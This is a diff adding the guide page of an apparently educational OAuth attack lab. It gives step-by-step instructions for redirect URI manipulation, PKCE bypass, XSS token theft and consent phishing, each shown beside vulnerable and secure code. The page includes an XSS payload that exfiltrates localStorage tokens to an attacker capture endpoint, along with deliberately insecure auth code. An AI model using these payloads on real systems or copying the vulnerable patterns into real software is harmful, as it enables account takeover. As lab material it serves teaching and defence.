+      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth.js</span></div>
+    </div>
+    <div class="atk-row" data-p="a2">
+      <div class="arow-n">2</div>
+      <div class="arow-info"><div class="arow-title">Authorization Code Interception — PKCE Bypass</div><div class="arow-sub">Stolen codes exchanged without code_verifier — no cryptographic binding</div></div>
+      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">token.js</span></div>
+    </div>
+    <div class="atk-row" data-p="a3">
+      <div class="arow-n">3</div>
+      <div class="arow-info"><div class="arow-title">Token Leakage via XSS</div><div class="arow-sub">localStorage tokens readable by any injected JavaScript — one fetch exfiltrates the full JWT</div></div>
+      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">client/server.js</span></div>
+    </div>
+    <div class="atk-row" data-p="a4">
+      <div class="arow-n">4</div>
+      <div class="arow-info"><div class="arow-title">OAuth Consent Abuse</div><div class="arow-sub">Malicious app requests admin scope via phishing — no approval gate in vulnerable mode</div></div>
+      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth.js</span></div>
+    </div>
+    <div class="atk-row" data-p="a5">
+      <div class="arow-n">5</div>
+      <div class="arow-info"><div class="arow-title">Refresh Token Abuse</div><div class="arow-sub">Non-rotating 10-year tokens give permanent unlimited access after a single theft</div></div>
+      <div class="arow-r"><span class="sev sev-cr">CRIT</span><span class="fbadge">token.js</span></div>
+    </div>
+    <div class="atk-row" data-p="a6">
+      <div class="arow-n">6</div>
+      <div class="arow-info"><div class="arow-title">Scope Escalation</div><div class="arow-sub">Server grants all requested scopes ignoring client registration — add admin to any flow</div></div>
+      <div class="arow-r"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth.js</span></div>
+    </div>
+    <div class="atk-row" data-p="a7">
+      <div class="arow-n">7</div>
+      <div class="arow-info"><div class="arow-title">JWT Algorithm Confusion (alg=none)</div><div class="arow-sub">CVE-2015-9235 — jwt.decode() skips signature check, forged tokens with admin claims accepted</div></div>
+      <div class="arow-r"><span class="sev sev-cr">CRIT</span><span class="fbadge">resource/server.js</span></div>
+    </div>
+  </div>
+
+  <div class="div-row"><span class="div-lbl">Mode Toggle</span><span class="div-line"></span></div>
+  <div class="mode-card" id="modeCard">
+    <div>
+      <div class="mode-card-status" id="mcStatus">—</div>
+      <div class="mode-card-desc" id="mcDesc">—</div>
+    </div>
+    <button class="toggle-btn" id="mcBtn" onclick="doToggle()">…</button>
+  </div>
+  <div id="toggle-status" style="font-size:11.5px;color:var(--ink3);margin-top:5px;min-height:14px"></div>
+
+  <div class="div-row"><span class="div-lbl">Test Credentials</span><span class="div-line"></span></div>
+  <table>
+    <thead><tr><th>Username</th><th>Password</th><th>Role</th></tr></thead>
+    <tbody>
+      <tr><td><code>alice</code></td><td><code>password123</code></td><td>Regular user — use for most attacks</td></tr>
+      <tr><td><code>admin</code></td><td><code>adminpass</code></td><td>Admin user</td></tr>
+    </tbody>
+  </table>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 1 ══ -->
+<div class="pg" id="pg-a1">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">01</div>
+      <div>
+        <div class="hero-title">Redirect URI Manipulation</div>
+        <div class="hero-sub">Weak URI validation lets an attacker steal the authorization code by redirecting it to their server. This exact pattern was exploited in CVE-2014-8671 (Facebook) and countless SSO misconfigurations.</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth-server/src/routes/auth.js → validateRedirectUri()</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>When you click Login, the client sends a <code>redirect_uri</code> parameter — this tells the auth server where to send the authorization code after you log in. The auth server must check this URI against its registered allowlist.</p>
+  <p><strong>The bug:</strong> The server uses <em>prefix matching</em> — it checks if your URI <em>starts with</em> a registered URI (minus the /callback). So <code>http://localhost:3002/callback</code> is registered, meaning anything starting with <code>http://localhost:3002</code> passes. An attacker crafts <code>http://localhost:3002.evil.com/steal</code> — this passes the check and the code lands on the attacker's server.</p>
+  <div class="note rd"><span class="note-ico">⚠️</span><span><strong>Must be in VULNERABLE mode.</strong> In SECURE mode the server returns <code>400 invalid_redirect_uri</code> before issuing any code.</span></div>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Open Monitoring</strong> in a new tab so you can watch security events fire in real time.</p>
+      <div class="cb"><div class="cb-head"><span>Monitoring Dashboard URL</span><div class="cb-acts"><button class="btn-open" onclick="openU('monitor','')">Open ↗</button></div></div><pre class="cc" id="a1-mon">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p><strong>Open this attack URL</strong> in your browser. The <code>redirect_uri</code> is set to <code>/evil-redirect</code> on the same domain (<code>localhost:3002</code>). This passes the auth server's prefix check — both the registered callback and this URL share the same <code>http://localhost:3002</code> prefix. After login, the code is automatically forwarded to the Attacker server's <code>/capture</code> endpoint.</p>
+      <div class="note bl"><span class="note-ico">💡</span><span>The URL is pre-built. Click <strong>Open ↗</strong> to fire it in your browser. Log in as <code>alice</code>, click Allow, and the code lands on the Attacker server.</span></div>
+      <div class="cb"><div class="cb-head"><span>Attack URL — open in your browser</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-open" id="a1-openbtn">Open ↗</button></div></div><pre class="cc" id="a1-url">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p>Log in as <code>alice</code> / <code>password123</code> and click <strong>Allow Access</strong>. The auth server's prefix check passes because the attacker domain starts with the registered prefix.</p>
+    </div></li>
+
+    <li><span class="sn">4</span><div class="sc">
+      <p><strong>The browser gets redirected to the Attacker server</strong> with the authorization code in the URL. Open the Attacker Dashboard — you'll see the captured code listed there.</p>
+      <div class="example-box"><span class="ex-label">🔍 How evil-redirect works</span>1. Browser hits: http://localhost:3002/evil-redirect?code=<strong style="color:var(--red)">abc123xyz789</strong>
+2. Client app at :3002 receives the code (passes prefix check ✅)
+3. Immediately redirects to: http://localhost:3004/capture?code=abc123xyz789
+4. Attacker server captures it!
+<br>Code looks like: <strong style="color:var(--red)">abc123xyz789</strong> (alphanumeric, ~40 chars)</div>
+      <div class="cb"><div class="cb-head"><span>Attacker Dashboard — find captured code here</span><div class="cb-acts"><button class="btn-open" onclick="openU('attacker','/dashboard')">Open ↗</button></div></div><pre class="cc" id="a1-dash">loading…</pre></div>
+      <p id="a1-code-status" style="font-size:12px;color:var(--green);font-family:var(--mono)"></p>
+    </div></li>
+
+    <li><span class="sn">5</span><div class="sc">
+      <p><strong>Exchange the stolen code for tokens.</strong> The command is auto-filled with the latest captured code. Notice <code>redirect_uri=.../evil-redirect</code> — this must match what was used in Step 2 (the auth server binds the code to that redirect URI).</p>
+      <div class="note yw"><span class="note-ico">📋</span><span>The <code>code=</code> field auto-fills from the Attacker server. If you see <code>PASTE_CODE_HERE</code> it means no code has been captured yet — complete Step 2 first.</span></div>
+      <div class="cb"><div class="cb-head"><span>Exchange stolen code for tokens</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a1-ex')">▶ Run</button></div></div><pre class="cc" id="a1-ex">loading…</pre></div>
+      <div class="paste-row" id="pr-a1-ex"><label>📋 Paste code here:</label><input id="inp-a1-ex" type="text" placeholder="Paste code from Attacker Dashboard…" oninput="setPlaceholder(this,'a1-ex','PASTE_CODE_FROM_ATTACKER_DASHBOARD')"><button class="apply-btn" onclick="applyPaste('inp-a1-ex','a1-ex','PASTE_CODE_FROM_ATTACKER_DASHBOARD')">Apply →</button></div>
+      <div class="example-box"><span class="ex-label">✅ Expected response (VULNERABLE mode)</span>{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...", "refresh_token":"rt_...", "token_type":"Bearer", "expires_in":3600}</div>
+    </div></li>
+
+    <li><span class="sn">6</span><div class="sc">
+      <p>Check Monitoring — you'll see a <code>REDIRECT_URI_MANIPULATION_ATTEMPT</code> event with severity HIGH. <br><strong>To test the fix:</strong> switch to Secure mode and open the attack URL again. The server returns <code>400 invalid_redirect_uri</code> and no code is issued.</p>
+    </div></li>
+  </ol>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — auth-server/src/routes/auth.js</div>
+    <div class="dc v">// Prefix match: "http://localhost:3002.evil.com" passes because:
+return registered.some(uri => requested.startsWith(uri.replace('/callback', '')));
+// registered: "http://localhost:3002/callback"
+// attacker:   "http://localhost:3002.evil.com/steal"
+// startsWith("http://localhost:3002") → true → PASSES ✗</div>
+    <div class="dh s">🟢 SECURE — exact match only (RFC 6749 §3.1.2)</div>
+    <div class="dc s">// Exact string equality — nothing else accepted
+return registered.includes(requested);
+// "http://localhost:3002.evil.com/steal" !== "http://localhost:3002/callback" → BLOCKED ✅</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 2 ══ -->
+<div class="pg" id="pg-a2">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">02</div>
+      <div>
+        <div class="hero-title">Authorization Code Interception (PKCE Bypass)</div>
+        <div class="hero-sub">Without PKCE, any attacker who obtains an authorization code can exchange it for access tokens. PKCE cryptographically binds the code to the originating client.</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth-server/src/routes/token.js → handleAuthCodeGrant()</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>PKCE adds a one-time secret to the OAuth flow. The client generates a random <code>code_verifier</code> and hashes it to get <code>code_challenge = SHA256(code_verifier)</code>. Only the hash goes to the auth server. At token exchange, the client must prove it knows the original verifier.</p>
+  <p><strong>The bug:</strong> In VULNERABLE mode, the PKCE check is completely skipped — <code>if (VULNERABLE) { console.warn('Skipping PKCE'); }</code>. Anyone with just the authorization code (from proxy logs, browser history, or Attack 1) can exchange it for tokens without knowing the verifier.</p>
+  <div class="note rd"><span class="note-ico">⚠️</span><span>You need an authorization code first. Use Attack 1 to capture one, or intercept one from a normal login flow. The code is auto-filled below if one was already captured.</span></div>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Capture a code first</strong> using the Attack 1 redirect URL. Open it in your browser, log in as <code>alice</code>, and the code lands on the Attacker server's <code>/capture</code> endpoint.</p>
+      <div class="cb"><div class="cb-head"><span>Step 1 — Capture code via Attack 1 redirect</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-open" id="a2-openbtn">Open ↗</button></div></div><pre class="cc" id="a2-url">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p><strong>Exchange the code without a <code>code_verifier</code>.</strong> The command is auto-filled with the latest captured code. Notice there's no <code>code_verifier</code> parameter — in VULNERABLE mode the server accepts it anyway.</p>
+      <div class="note yw"><span class="note-ico">📋</span><span>Code is auto-filled from Attacker server. If it still shows <code>PASTE_CODE_HERE</code>, complete Step 1 first to capture a code.</span></div>
+      <div class="cb"><div class="cb-head"><span>Exchange code — NO code_verifier (PKCE bypassed)</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a2-curl')">▶ Run</button></div></div><pre class="cc" id="a2-curl">loading…</pre></div>
+      <div class="paste-row" id="pr-a2-curl"><label>📋 Paste code here:</label><input id="inp-a2-curl" type="text" placeholder="Paste code from Attacker Dashboard…" oninput="setPlaceholder(this,'a2-curl','PASTE_CODE_FROM_ATTACKER_DASHBOARD')"><button class="apply-btn" onclick="applyPaste('inp-a2-curl','a2-curl','PASTE_CODE_FROM_ATTACKER_DASHBOARD')">Apply →</button></div>
+      <div class="example-box"><span class="ex-label">✅ VULNERABLE result</span>{"access_token":"eyJ...", "refresh_token":"rt_...", "token_type":"Bearer"}
+<br><span class="ex-label" style="margin-top:6px">❌ SECURE result</span>{"error":"invalid_grant","error_description":"PKCE code_verifier mismatch"}</div>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p><strong>Use the stolen token</strong> against the Resource API to confirm the attack worked:</p>
+      <div class="note yw"><span class="note-ico">📋</span><span>Copy the <code>access_token</code> value from the response above (the long <code>eyJ…</code> string). Paste it in place of <code>PASTE_ACCESS_TOKEN</code> in the command below. It looks like: <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOi...</code></span></div>
+      <div class="cb"><div class="cb-head"><span>Use stolen token against Resource API</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a2-use')">▶ Run</button></div></div><pre class="cc" id="a2-use">loading…</pre></div>
+    </div></li>
+  </ol>
+
+  <h2>PKCE Flow Visualised</h2>
+  <div class="cb"><div class="cb-head"><span>How PKCE binds the code to the client</span><button class="btn-copy" onclick="cpb(this)">Copy</button></div><pre class="cc">Client generates BEFORE sending authorization request:
+  code_verifier  = crypto.randomBytes(32).toString('base64url')  // stays secret on client
+  code_challenge = BASE64URL(SHA256(code_verifier))              // sent to auth server
+
+GET /oauth/authorize?…&code_challenge=CHALLENGE&code_challenge_method=S256
+  → Auth server stores: { code: "abc123", challenge: "CHALLENGE" }
+
+POST /oauth/token { code: "abc123", code_verifier: VERIFIER }
+  → Server: BASE64URL(SHA256(VERIFIER)) === CHALLENGE → access_token issued ✅
+  → Attacker has "abc123" but not VERIFIER               → 400 invalid_grant ❌</pre></div>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — auth-server/src/routes/token.js</div>
+    <div class="dc v">if (VULNERABLE) {
+  console.warn('⚠️  [VULNERABLE] Skipping PKCE verification');
+  // no check — code exchanged without verifying code_verifier
+}</div>
+    <div class="dh s">🟢 SECURE — PKCE enforced</div>
+    <div class="dc s">const expected = crypto.createHash('sha256')
+  .update(code_verifier).digest('base64url');
+if (authCode.code_challenge !== expected) {
+  return res.status(400).json({ error: 'invalid_grant', error_description: 'PKCE code_verifier mismatch' });
+}</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 3 ══ -->
+<div class="pg" id="pg-a3">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">03</div>
+      <div>
+        <div class="hero-title">Token Leakage via XSS</div>
+        <div class="hero-sub">Tokens stored in localStorage are readable by any JavaScript on the page. One injected script and the attacker has the full access token — no user interaction needed after that.</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-hi">HIGH</span><span class="fbadge">client-app/src/server.js → /callback</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>In VULNERABLE mode, when you log in, the client stores your token in <code>localStorage</code>: <code>localStorage.setItem('access_token', token)</code>. localStorage is shared across all scripts on the domain — any injected JS can read it.</p>
+  <p>The lab includes a simulated XSS payload at <code>/xss-demo</code>. This page reads <code>localStorage.getItem('access_token')</code> and sends it to the Attacker server's <code>/capture</code> endpoint, just like a real XSS attack would.</p>
+  <div class="note rd"><span class="note-ico">⚠️</span><span><strong>First log in</strong> to the Client App as <code>alice</code> to put a real token in localStorage. Then the XSS demo can steal it.</span></div>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Log in to the Client App</strong> as <code>alice / password123</code>. This puts a real access token in localStorage. You'll be redirected to the dashboard — that's expected.</p>
+      <div class="cb"><div class="cb-head"><span>Client App Login Page</span><div class="cb-acts"><button class="btn-open" onclick="openU('client','/login')">Open ↗</button></div></div><pre class="cc" id="a3-login">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p><strong>Now visit the XSS demo page</strong> (same domain as the client app). This page simulates a stored XSS payload — it reads localStorage and exfiltrates the token to the Attacker server.</p>
+      <div class="example-box"><span class="ex-label">💉 What the XSS payload does</span>// Simulated XSS script (runs on /xss-demo)
+const token = localStorage.getItem('access_token');  // ← reads YOUR token
+fetch('http://localhost:3004/capture?token=' + encodeURIComponent(token));  // ← sends to attacker</div>
+      <div class="cb"><div class="cb-head"><span>XSS Demo Page — triggers token theft</span><div class="cb-acts"><button class="btn-open" onclick="openU('client','/xss-demo')">Open ↗</button></div></div><pre class="cc" id="a3-xss">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p><strong>Open Attacker Dashboard</strong> — the stolen token appears under "Captured Tokens via XSS". Copy the full token (the long <code>eyJ…</code> string).</p>
+      <div class="example-box"><span class="ex-label">🔍 What a captured token looks like</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<strong style="color:var(--red)">eyJzdWIiOiJ1c2VyLTEiLCJ1c2VybmFtZSI6ImFsaWNlIiwic2NvcGUiOiJyZWFkIHByb2ZpbGUiLCJleHAiOjE2OTkwMDAwMDB9</strong>.xXxXxX
+<br>↳ Copy everything including the dots</div>
+      <div class="cb"><div class="cb-head"><span>Attacker Dashboard — stolen tokens here</span><div class="cb-acts"><button class="btn-open" onclick="openU('attacker','/dashboard')">Open ↗</button></div></div><pre class="cc" id="a3-dash">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">4</span><div class="sc">
+      <p><strong>Use the stolen token</strong> against the Resource API. The auto-fill below uses the latest token from the Attacker server. If it shows <code>PASTE_TOKEN_HERE</code>, complete Steps 1–3 first.</p>
+      <div class="cb"><div class="cb-head"><span>Use stolen token against Resource API</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a3-curl')">▶ Run</button></div></div><pre class="cc" id="a3-curl">loading…</pre></div>
+      <div class="example-box"><span class="ex-label">✅ VULNERABLE result</span>{"id":"user-1","username":"alice","email":"alice@example.com","roles":["user"]}
+<span class="ex-label" style="margin-top:6px">❌ SECURE result</span>Token is HttpOnly cookie — XSS cannot access it. The /xss-demo page finds nothing in localStorage.</div>
+    </div></li>
+  </ol>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — client-app/src/server.js</div>
+    <div class="dc v">// Token stored in localStorage — readable by ANY JavaScript
+res.redirect(`/dashboard?token=${accessToken}`);
+// In dashboard page:
+localStorage.setItem('access_token', accessToken);  // ← XSS can read this</div>
+    <div class="dh s">🟢 SECURE — HttpOnly cookie</div>
+    <div class="dc s">// Token stored in HttpOnly cookie — JavaScript cannot access it
+res.cookie('access_token', accessToken, {
+  httpOnly: true,   // ← no JS access
+  secure: true,     // ← HTTPS only
+  sameSite: 'Strict' // ← no cross-site sending
+});</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 4 ══ -->
+<div class="pg" id="pg-a4">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">04</div>
+      <div>
+        <div class="hero-title">OAuth Consent Abuse</div>
+        <div class="hero-sub">A malicious OAuth client requests privileged scopes (admin) that it's not registered for. In vulnerable mode, no approval gate exists — the auth server simply grants what's asked.</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth-server/src/routes/auth.js → privileged scope check</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>The Attacker server hosts a phishing page that initiates a real OAuth flow using the <code>malicious-client</code> credentials. This client requests <code>admin</code> scope — a privileged scope it's not registered for.</p>
+  <p><strong>The bug:</strong> The vulnerable code has a guard that's never triggered: <code>if (!VULNERABLE && hasPrivilegedScope && !client.trusted)</code>. Since VULNERABLE is true, the check never runs and the server grants the admin scope.</p>
+  <div class="note rd"><span class="note-ico">⚠️</span><span>This attack uses the <strong>malicious-client</strong> (not legitimate-client). Credentials: <code>malicious-client</code> / <code>evil-secret-666</code>. These are pre-registered in the auth server.</span></div>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Open the Phishing Page</strong> — this is the malicious-client's attack entry point hosted on the Attacker server. It shows a realistic OAuth consent screen.</p>
+      <div class="cb"><div class="cb-head"><span>Phishing Page — malicious OAuth consent</span><div class="cb-acts"><button class="btn-open" onclick="openU('attacker','/phishing')">Open ↗</button></div></div><pre class="cc" id="a4-phish">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p>The phishing page redirects you to the real auth server. Log in as <code>alice / password123</code> and click Allow. The malicious-client gets an authorization code with admin scope.</p>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p><strong>Open Attacker Dashboard</strong> to find the captured code. Then exchange it for tokens using the malicious-client credentials.</p>
+      <div class="cb"><div class="cb-head"><span>Attacker Dashboard — find code here</span><div class="cb-acts"><button class="btn-open" onclick="openU('attacker','/dashboard')">Open ↗</button></div></div><pre class="cc" id="a4-dash">loading…</pre></div>
+      <p id="a4-code-status" style="font-size:12px;color:var(--green);font-family:var(--mono)"></p>
+    </div></li>
+
+    <li><span class="sn">4</span><div class="sc">
+      <p><strong>Exchange the code</strong> using malicious-client credentials. The command is auto-filled with the latest captured code.</p>
+      <div class="note yw"><span class="note-ico">📋</span><span>Note the <code>client_id=malicious-client</code> and <code>client_secret=evil-secret-666</code> — different from the legitimate client!</span></div>
+      <div class="cb"><div class="cb-head"><span>Exchange code using malicious-client</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a4-curl')">▶ Run</button></div></div><pre class="cc" id="a4-curl">loading…</pre></div>
+      <div class="paste-row" id="pr-a4-curl"><label>📋 Paste code here:</label><input id="inp-a4-curl" type="text" placeholder="Paste code from Attacker Dashboard…" oninput="setPlaceholder(this,'a4-curl','PASTE_CODE_FROM_ATTACKER_DASHBOARD')"><button class="apply-btn" onclick="applyPaste('inp-a4-curl','a4-curl','PASTE_CODE_FROM_ATTACKER_DASHBOARD')">Apply →</button></div>
+    </div></li>
+
+    <li><span class="sn">5</span><div class="sc">
+      <p><strong>Use the admin token</strong> to call the admin API. Copy the <code>access_token</code> from the response above and paste it below (it looks like <code>eyJ0eXAiOiJKV1Qi…</code>).</p>
+      <div class="cb"><div class="cb-head"><span>Admin API call with malicious-client token</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a4-admin')">▶ Run</button></div></div><pre class="cc" id="a4-admin">loading…</pre></div>
+      <div class="example-box"><span class="ex-label">✅ VULNERABLE result</span>[{"id":"user-1","username":"alice",...},{"id":"user-2","username":"admin",...}]
+<span class="ex-label" style="margin-top:6px">❌ SECURE result</span>{"error":"admin_approval_required","error_description":"Privileged scopes require admin pre-approval"}</div>
+    </div></li>
+  </ol>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — auth-server/src/routes/auth.js</div>
+    <div class="dc v">// Guard condition is NEVER true in vulnerable mode:
+if (!VULNERABLE && hasPrivilegedScope && !client.trusted) {
+  return res.status(403).json({ error: 'admin_approval_required' });
+}
+// VULNERABLE=true → condition skipped → admin scope granted ✗</div>
+    <div class="dh s">🟢 SECURE — approval gate active</div>
+    <div class="dc s">if (hasPrivilegedScope && !client.trusted) {
+  return res.status(403).json({
+    error: 'admin_approval_required',
+    error_description: 'Privileged scopes require admin pre-approval'
+  });
+}</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 5 ══ -->
+<div class="pg" id="pg-a5">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">05</div>
+      <div>
+        <div class="hero-title">Refresh Token Abuse</div>
+        <div class="hero-sub">Without refresh token rotation, a stolen refresh token gives the attacker permanent account access forever. Tokens in this lab are set to expire in 3650 days (10 years).</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-cr">CRIT</span><span class="fbadge">auth-server/src/routes/token.js → handleRefreshTokenGrant()</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>When you log in, you get both an <code>access_token</code> (short-lived, ~1 hour) and a <code>refresh_token</code> (long-lived). The refresh token is used to get new access tokens without re-logging in.</p>
+  <p><strong>The bug:</strong> In VULNERABLE mode, the same refresh token works <em>indefinitely</em> and never gets rotated. A stolen refresh token gives the attacker unlimited access as long as the account exists.</p>
+  <p><strong>In SECURE mode:</strong> Every time a refresh token is used, the old one is revoked and a new one is issued. If an attacker uses a stolen token, the legitimate user's next refresh fails, alerting to the compromise.</p>
+  <div class="note rd"><span class="note-ico">⚠️</span><span>You need a refresh token. Log in to the Client App first — in VULNERABLE mode the token is in localStorage. Open DevTools → Application → localStorage to find it.</span></div>
+
+  <h2>Step-by-Step Execution</h2>
+  <ol class="steps">
+    <li><span class="sn">1</span><div class="sc">
+      <p><strong>Log in to Client App</strong> as <code>alice / password123</code>. After login you land on the dashboard.</p>
+      <div class="cb"><div class="cb-head"><span>Client App Login</span><div class="cb-acts"><button class="btn-open" onclick="openU('client','/login')">Open ↗</button></div></div><pre class="cc" id="a5-login">loading…</pre></div>
+    </div></li>
+
+    <li><span class="sn">2</span><div class="sc">
+      <p><strong>Get the refresh token from localStorage</strong> (simulating theft). Open browser DevTools:</p>
+      <div class="example-box"><span class="ex-label">🔍 How to find the refresh token</span>1. Press F12 → Application tab (Chrome) or Storage tab (Firefox)
+2. Click "Local Storage" → "http://localhost:3002"
+3. Find the "refresh_token" key
+4. Copy the value — paste it in the input box below the curl command</div>
+    </div></li>
+
+    <li><span class="sn">3</span><div class="sc">
+      <p><strong>Use the stolen refresh token</strong> to get a new access token. Replace <code>PASTE_REFRESH_TOKEN</code> with the <code>rt_…</code> value you copied.</p>
+      <div class="cb"><div class="cb-head"><span>Use stolen refresh token</span><div class="cb-acts"><button class="btn-copy" onclick="cpb(this)">Copy</button><button class="btn-run" onclick="runC(this,'a5-curl')">▶ Run</button></div></div><pre class="cc" id="a5-curl">loading…</pre></div>
+      <div class="paste-row" id="pr-a5-curl"><label>📋 Paste refresh token:</label><input id="inp-a5-curl" type="text" placeholder="Paste from DevTools → Application → localStorage → refresh_token" oninput="setPlaceholder(this,'a5-curl','PASTE_REFRESH_TOKEN')"><button class="apply-btn" onclick="applyPaste('inp-a5-curl','a5-curl','PASTE_REFRESH_TOKEN')">Apply →</button></div>
+      <div class="example-box"><span class="ex-label">✅ VULNERABLE result — works every time</span>{"access_token":"eyJ...NEW_TOKEN...", "refresh_token":"rt_AbCdEfGhIjKlMnOpQrStUvWxYz123456"}
+↳ Notice: same refresh_token returned — it never changes!
+<span class="ex-label" style="margin-top:6px">❌ SECURE result — rotates on use</span>{"access_token":"eyJ...NEW_TOKEN...", "refresh_token":"rt_COMPLETELY_DIFFERENT_TOKEN"}
+↳ Old token is now invalid — attacker's copy won't work again</div>
+    </div></li>
+
+    <li><span class="sn">4</span><div class="sc">
+      <p><strong>Check the token state</strong> in the Auth Server admin panel — you can see which tokens are active and their expiry:</p>
+      <div class="cb"><div class="cb-head"><span>Auth Server — Refresh Token Admin Panel</span><div class="cb-acts"><button class="btn-open" id="a5-rtoks-btn" onclick="">Open ↗</button></div></div><pre class="cc" id="a5-rtoks">loading…</pre></div>
+    </div></li>
+  </ol>
+
+  <h2>Vulnerable vs Secure Code</h2>
+  <div class="diff">
+    <div class="dh v">🔴 VULNERABLE — auth-server/src/routes/token.js</div>
+    <div class="dc v">// Token expiry: 3650 days, never rotated
+const expiryDays = VULNERABLE ? 3650 : 30;
+// Old token kept as-is — same token works forever
+return res.json({ access_token, refresh_token: existingToken });</div>
+    <div class="dh s">🟢 SECURE — rotation on every use</div>
+    <div class="dc s">// Revoke old token immediately
+db.prepare('UPDATE refresh_tokens SET revoked=1 WHERE token=?').run(oldToken);
+// Issue new token — old one no longer works
+const newRefresh = generateRefreshToken(userId, clientId, scopes);
+return res.json({ access_token, refresh_token: newRefresh });</div>
+  </div>
+  <div class="pgfoot"><span>Built by <a href="https://linkedin.com/in/SinhaAmrit" target="_blank">SinhaAmrit</a></span><span>Educational use only</span></div>
+</div>
+
+<!-- ══ ATTACK 6 ══ -->
+<div class="pg" id="pg-a6">
+  <div class="atk-hero">
+    <div class="hero-row">
+      <div class="hero-n">06</div>
+      <div>
+        <div class="hero-title">Scope Escalation</div>
+        <div class="hero-sub">The auth server grants whatever scopes the client requests, ignoring the registered scope list. A legitimate client registered for "read profile email" can request and receive "admin write" instead.</div>
+      </div>
+    </div>
+    <div class="hero-meta"><span class="sev sev-hi">HIGH</span><span class="fbadge">auth-server/src/routes/auth.js → validateScopes()</span></div>
+  </div>
+
+  <h2>How This Attack Works</h2>
+  <p>When an OAuth client registers with an auth server, it declares the scopes it needs (e.g. <code>read profile email</code>). The auth server should only grant the <em>intersection</em> of what's requested and what's registered.</p>
